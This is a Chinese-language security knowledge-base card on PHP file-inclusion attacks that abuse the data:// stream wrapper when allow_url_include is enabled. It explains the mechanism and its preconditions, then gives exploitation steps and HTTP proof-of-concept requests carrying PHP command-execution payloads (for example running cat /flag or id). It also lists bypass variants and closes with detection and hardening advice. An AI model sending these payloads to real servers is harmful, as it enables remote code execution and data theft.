---
id: web-php-file-inclusion-data-wrapper-short-tag-rce
title: PHP data:// 伪协议包含 + 短标签：allow_url_include 开启时 LFI 直接执行内联 PHP
type: scenario
domain: web
path: web/php/file-inclusion
technique: php-data-wrapper-short-tag-rce
tags:
- php
- file-inclusion
- lfi
- data-wrapper
- allow-url-include
- short-tag
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-166
  verified_at: '2026-11-06T09:57:29+08:00'
  notes: 已对照原文 signin 段核对 data:,<?=`$_GET[0]`; 载荷。修正卡内技术表述：<?= 是短 echo 标签，自 PHP 5.4 起默认可用、不依赖 short_open_tag；short_open_tag 仅影响 <?。核心链（allow_url_include=On + data wrapper + 短 echo 标签）成立；原文仅一行 payload、无截图回显
url: /docs/web/php/file-inclusion/web-php-file-inclusion-data-wrapper-short-tag-rce/
draft: false
kb_aliases:
- data:// 伪协议包含
- data:, 短标签
- allow_url_include RCE
- LFI data wrapper
- ?file=data:,
- <?= 短标签执行
---

## 一句话结论

当 PHP 的 `allow_url_include=On` 时，一个可控的 `include`/`require` 路径可以直接用 `data:,<?=`$_GET[0]`;` 或 `data://text/plain,<?php ... ?>` 内联执行任意 PHP，无需先上传文件或写日志。

## 原理

- `data:` 是 PHP 的 URL 流包装器，格式为 `data:[<mediatype>][;base64],<data>`；`data:,` 表示空 mediatype，逗号后的内容就是“文件内容”。
- 当 `allow_url_include=On` 时，`include`/`require` 允许包含 `data://` 等 URL 包装器；若被包含内容是 PHP 代码，PHP 解析器会直接执行。
- `<?=` 是短 echo 标签，自 PHP 5.4 起默认可用、不受 `short_open_tag` 控制，等价于 `<?php echo ...; ?>`；`<?=`$_GET[0]`;` 会执行 `$_GET[0]` 参数中的 PHP 代码。完整 `<?php system($_GET[0]); ?>` 标签则始终可用。
- 攻击者只需控制 include 的文件名参数（如 `?file=`），把路径替换为 `data:,<PHP 代码>`；URL 中的特殊字符按需编码。
- 该原语的价值在于“无文件落地”：不依赖上传目录可写、不依赖日志路径可预测，也不依赖 `php://filter` 链；但强依赖 `allow_url_include=On`（默认 Off），且被包含内容需含可被解析的 PHP 标签（`<?=` 自 PHP 5.4 起默认可用，`<?php` 始终可用）。

## 触发条件

- 存在 LFI：用户可控参数直接进入 `include`/`require`（或 `include_once` 等），且没有对 `data:` 等包装器做协议白名单。
- `allow_url_include=On`（PHP 默认 Off，部分 CTF/旧环境会开启）；部分环境还要求 `allow_url_fopen=On`。
- 完整 `<?php` 标签始终可用；`<?=` 自 PHP 5.4 起默认可用，无需 `short_open_tag=On`（该配置只影响 `<?`）。
- 被包含内容不会被 `open_basedir`/WAF 拦截；`data:` 内容长度受配置/请求限制。

## 利用步骤

1. 确认 LFI 参数与包含行为：`?file=index.php` 正常、`?file=/etc/passwd` 泄露源码，说明是 include 而非纯读取。
2. 尝试 `?file=data:,<?php phpinfo(); ?>` 或 `?file=data:,<?=`id`;`，观察是否执行；若 `data:` 被过滤，尝试 `data://text/plain,`、大小写/URL 编码变体。
3. 用参数化 payload 执行命令：`?file=data:,<?=`$_GET[0]`;&0=cat /flag`；或 `?file=data://text/plain,<?php system($_GET['c']); ?>&c=id`。
4. 需要回显时把命令输出 `echo` 到响应；无回显时用 DNS/HTTP 外带。
5. 若 `<?=` 被 WAF 拦截或目标为 PHP < 5.4，改用完整 `<?php`；若 `allow_url_include=Off`，改用日志包含、`php://filter` 链、session 文件或上传临时文件等替代路径。

## PoC

```http
GET /?file=data:,<?=`$_GET[0]`;&0=cat%20/flag HTTP/1.1
Host: target
```

等价的完整标签形式：

```http
GET /?file=data://text/plain,<?php%20system($_GET['c']);%20?>&c=id HTTP/1.1
Host: target
```

```text
说明：
- data:, 后的内容即被包含的“文件”，PHP 会当作代码解析；
- `<?=` 是短 echo 标签，自 PHP 5.4 起默认可用，不依赖 short_open_tag；
- allow_url_include=Off 时该链不成立。
```

## 变体与关联

- 变体：`data://text/plain;base64,<base64(PHP)>`，绕过对 `<`、`?` 等字符的简单过滤。
- 变体：`php://input` + POST body 作为 PHP 代码（同样依赖 `allow_url_include=On`）；`php://filter` 链用于无文件包含（不依赖 `allow_url_include`）。
- 变体：`expect://`（需 expect 扩展）直接执行命令。
- 关联：[[web-php-file-inclusion-filter-chain-fileless-rce]]（无文件包含的另一条路径）；[[web-php-file-inclusion-access-log-poisoning-webshell]]、[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（需要落盘的替代方案）。
- 边界：`allow_url_include=Off`、`data:` 被协议白名单拒绝、`open_basedir` 限制、WAF 拦截 `data:` 关键字时不可用。

## 检测与防御

- 检测：请求参数中出现 `data:,`、`data://`、`php://input` 等包装器；包含路径参数包含 `<?`/`<?=`；响应出现命令输出或异常包含错误。
- 防御：`allow_url_include=Off`（默认值，保持关闭）、`allow_url_fopen=Off`（如业务允许）；include 路径使用白名单/固定映射，禁止用户输入直接拼接。
- 加固：关闭 `short_open_tag` 只能限制 `<?`、无法阻止 `<?=`；重点应保持 `allow_url_include=Off`，部署 WAF/主机层规则拦截 `data:`、`php://input` 等危险包装器；限制 Web 进程对敏感文件的读取权限。
